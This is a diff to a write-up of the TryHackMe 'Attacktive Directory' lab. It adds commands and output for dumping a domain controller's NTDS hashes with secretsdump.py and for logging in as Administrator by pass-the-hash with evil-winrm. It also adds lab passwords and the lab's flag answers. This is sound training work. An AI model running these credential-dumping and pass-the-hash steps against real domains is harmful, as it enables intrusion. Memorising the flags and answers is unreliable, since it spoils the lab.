@@ -13,7 +13,7 @@ published: true
 
 ## [](#header-2)Task 3 - Welcome to Attacktive Directory 
 
-```
+```shell
 ┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
 └─$ nmap -sV -sC -T4 10.10.132.136 -p- -oN initial
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:44 PDT
@@ -113,7 +113,7 @@ Kerberos is a key authentication service within Active Directory. With this port
 
 - ``./kerbrute_linux_amd64 userenum --dc 10.10.132.136:88 -d spookysec.local userlist.txt``
 
-```
+```shell
 2022/06/20 07:49:18 >  [+] VALID USERNAME:       james@spookysec.local
 2022/06/20 07:49:21 >  [+] VALID USERNAME:       svc-admin@spookysec.local
 2022/06/20 07:49:25 >  [+] VALID USERNAME:       James@spookysec.local
@@ -214,31 +214,94 @@ With a user's account credentials we now have significantly more access within t
 
 ## [](#header-2)Task 7 - Domain Privilege Escalation - Elevating Privileges within the Domain 
 
-We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.
+Now that we have ``backup@spookysec.local:backup2517860`` We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.
 
 ##### [](#header-5)Answer the questions below
 
+```shell
+┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
+└─$ /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.132.136 -outputfile secretsdump.txt 
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:e3a602bef4ccbcbc0c468b0dd6d50e7d:::
+[*] Kerberos keys grabbed
+```
+
 **What method allowed us to dump NTDS.DIT?**
 
-
+- DRSUAPI
 
 **What is the Administrators NTLM hash?**
 
-
+- 0e0363213e37b94221497260b0bcb4fc
 
 **What method of attack could allow us to authenticate as the user without the password?**
 
-
+- Pass the Hash
 
 **Using a tool called Evil-WinRM what option will allow us to use a hash?**
 
-
+- ``evil-winrm -h`` -H, --hash HASH                  NTHash
 
 * * * 
 
+## [](#header-2)Task 8 - Flag Submission Flag Submission Panel 
 
+Cool site: https://wadcoms.github.io/#
 
+Submit the flags for each user account. They can be located on each user's desktop.
 
+##### [](#header-5)Answer the questions below
 
+### [](#header-3)svc-admin 
 
+- credentials user:svc-admin pass:management2005
+- TryHackMe{K3rb3r0s_Pr3_4uth}
 
+### [](#header-3)backup
+
+- credentials user:backup pass:backup2517860
+- TryHackMe{B4ckM3UpSc0tty!}
+
+### [](#header-3)Administrator
+
+- credentials user:Administrator pass: We can Pass the Hash with below command.
+
+```shell
+┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
+└─$ evil-winrm -i 10.10.132.136 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+
+- TryHackMe{4ctiveD1rectoryM4st3r}
+
+* * * 
